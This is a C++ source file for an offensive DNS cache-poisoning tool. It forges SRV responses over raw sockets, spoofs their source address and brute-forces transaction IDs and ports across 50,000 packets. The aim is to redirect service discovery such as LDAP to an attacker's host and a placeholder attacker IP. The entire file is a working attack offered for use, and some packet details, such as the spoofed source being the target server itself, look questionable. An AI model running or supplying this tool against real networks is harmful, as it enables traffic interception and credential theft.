// Compile: g++ -o srv_poison srv_poison.cpp
// Run: sudo ./srv_poison <target_dns> <service_domain> <attacker_host>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class SRVPoison {
private:
    std::string targetDNS, serviceDomain, attackerHost;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    SRVPoison(const std::string& dns, const std::string& svc, 
              const std::string& host)
        : targetDNS(dns), serviceDomain(svc), attackerHost(host) {}
    
    // Poison SRV record - hijacks service discovery (LDAP, SIP, XMPP, etc.)
    void poisonSRV(uint16_t txid, uint16_t dstPort) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[1024];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);
        *(uint16_t*)(dns + 6) = htons(1);  // SRV + A (glue)
        *(uint16_t*)(dns + 8) = htons(0);
        *(uint16_t*)(dns + 10) = htons(1);
        
        int pos = 12;
        
        // Question: _service._proto.domain
        pos += encodeName(dns + pos, serviceDomain);
        *(uint16_t*)(dns + pos) = htons(33); pos += 2;  // SRV
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        // SRV Answer: priority=0, weight=0, port=attacker_port, target=attackerHost
        pos += encodeName(dns + pos, serviceDomain);
        *(uint16_t*)(dns + pos) = htons(33); pos += 2;  // SRV
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        
        int srvLenPos = pos;
        pos += 2;
        int srvStart = pos;
        
        *(uint16_t*)(dns + pos) = htons(0); pos += 2;   // Priority (highest)
        *(uint16_t*)(dns + pos) = htons(0); pos += 2;   // Weight
        *(uint16_t*)(dns + pos) = htons(389); pos += 2; // Port (LDAP example)
        pos += encodeName(dns + pos, attackerHost);
        
        *(uint16_t*)(dns + srvLenPos) = htons(pos - srvStart);
        
        // Glue A record for attackerHost
        pos += encodeName(dns + pos, attackerHost);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // A
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        // Use attacker's IP
        struct in_addr addr;
        inet_aton("1.2.3.4", &addr);  // Attacker server
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run(int attempts) {
        std::cout << "[*] SRV record poisoning\n";
        std::cout << "[*] Service: " << serviceDomain << "\n";
        std::cout << "[*] Attacker host: " << attackerHost << "\n";
        
        for (int i = 0; i < attempts; i++) {
            uint16_t txid = rand() & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            poisonSRV(txid, port);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <dns> <service_domain> <attacker_host>\n";
        return 1;
    }
    srand(time(NULL));
    SRVPoison poison(argv[1], argv[2], argv[3]);
    poison.run(50000);
    return 0;
}
